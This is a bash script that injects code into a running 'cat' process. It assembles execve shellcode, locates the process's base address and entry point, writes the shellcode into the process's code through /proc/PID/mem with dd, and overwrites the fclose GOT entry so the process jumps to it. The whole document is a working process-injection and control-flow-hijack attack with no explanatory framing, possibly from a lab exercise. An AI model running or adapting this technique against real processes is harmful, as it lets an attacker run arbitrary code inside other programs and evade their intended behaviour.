#!/bin/bash

PID=$1

if [ -z "$PID" ]; then
  echo "Failed to find cat process"
  exit 1
fi
echo "Found cat process with PID: $PID"

echo "Compiling shellcode..."
as -o execve.o execve.s || {
  echo "Failed to assemble execve.s"
  exit 1
}
ld -o execve execve.o || {
  echo "Failed to link execve.o"
  exit 1
}
objcopy -O binary execve loader.bin || {
  echo "Failed to create loader.bin"
  exit 1
}

BASE_ADDR=$(cat /proc/$PID/maps | grep /bin/cat | grep -m 1 "r-xp" | awk '{print $1}' | cut -d'-' -f1)
if [ -z "$BASE_ADDR" ]; then
  echo "Failed to find base address for /bin/cat"
  exit 1
fi
echo "Cat base address: 0x$BASE_ADDR"

ENTRY_OFFSET=$(readelf -h /bin/cat | grep "Entry point" | awk '{print $NF}')
if [ -z "$ENTRY_OFFSET" ]; then
  echo "Failed to retrieve entry point offset"
  exit 1
fi
echo "Entry point offset: $ENTRY_OFFSET"

ENTRY_DEC=$((16#${ENTRY_OFFSET#0x}))
BASE_DEC=$((16#$BASE_ADDR))
ENTRY_ADDR=$((BASE_DEC + ENTRY_DEC))
ENTRY_HEX=$(printf "0x%x" $ENTRY_ADDR)
echo "Final entry point address: $ENTRY_HEX"

if [ ! -f ./find_got ]; then
  gcc -o find_got find_got.c || {
    echo "Failed to compile find_got.c"
    exit 1
  }
fi
GOT_OFFSET=$(./find_got /bin/cat fclose)
if [ -z "$GOT_OFFSET" ]; then
  echo "Failed to find GOT offset for fclose"
  exit 1
fi
echo "GOT offset for fclose: $GOT_OFFSET"

GOT_OFFSET_DEC=$((16#${GOT_OFFSET#0x}))
GOT_ADDR=$((BASE_DEC + GOT_OFFSET_DEC))
GOT_HEX=$(printf "0x%x" $GOT_ADDR)
echo "GOT address for fclose: $GOT_HEX"

ENTRY_HEX=$(printf "%016x" $ENTRY_ADDR)
REVERSED_HEX=""
for ((i = 14; i >= 0; i -= 2)); do
  REVERSED_HEX="${REVERSED_HEX}${ENTRY_HEX:$i:2}"
done
printf "$(echo $REVERSED_HEX | sed 's/../\\x&/g')" >pc.bin
if [ ! -s pc.bin ]; then
  echo "Failed to create pc.bin"
  exit 1
fi
echo "Created pc.bin with entry point address"

dd if=loader.bin of=/proc/$PID/mem conv=notrunc bs=1 seek=$ENTRY_ADDR || {
  echo "Failed to write loader.bin to memory"
  exit 1
}
echo "Injected shellcode into entry point"

dd if=pc.bin of=/proc/$PID/mem conv=notrunc bs=1 seek=$GOT_ADDR || {
  echo "Failed to write pc.bin to GOT entry"
  exit 1
}
echo "Overwrote GOT entry for fclose"
